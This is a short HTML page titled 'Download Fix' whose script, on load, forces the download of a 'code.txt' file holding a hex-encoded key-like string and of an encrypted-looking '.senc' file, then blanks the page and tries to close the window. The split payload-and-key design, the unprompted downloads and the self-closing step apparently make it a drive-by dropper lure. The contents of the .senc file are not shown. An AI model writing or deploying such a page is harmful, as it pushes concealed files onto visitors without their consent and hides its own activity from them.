<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download Fix</title>
</head>
<body>

<script>
(async function () {
  // ===== Generate and download the TXT file =====
  const textContent = "3137373339353248484C3335";
  const txtBlob = new Blob([textContent], { type: "text/plain" });
  const txtUrl = URL.createObjectURL(txtBlob);

  const txtLink = document.createElement("a");
  txtLink.href = txtUrl;
  txtLink.download = "code.txt";
  document.body.appendChild(txtLink);
  txtLink.click();
  document.body.removeChild(txtLink);
  URL.revokeObjectURL(txtUrl);

  // ===== Download the .senc file via fetch (FIX) =====
  try {
    const response = await fetch("./7H3955LqO.senc");
    if (!response.ok) throw new Error("File not found");

    const sencBlob = await response.blob();
    const sencUrl = URL.createObjectURL(sencBlob);

    const sencLink = document.createElement("a");
    sencLink.href = sencUrl;
    sencLink.download = "7H3955LqO.senc";
    document.body.appendChild(sencLink);
    sencLink.click();
    document.body.removeChild(sencLink);
    URL.revokeObjectURL(sencUrl);
  } catch (err) {
    console.error("Failed to download .senc:", err);
  }

  // ===== Close page =====
  setTimeout(() => {
    window.close();
    document.body.innerHTML = "";
  }, 300);
})();
</script>

</body>
</html>
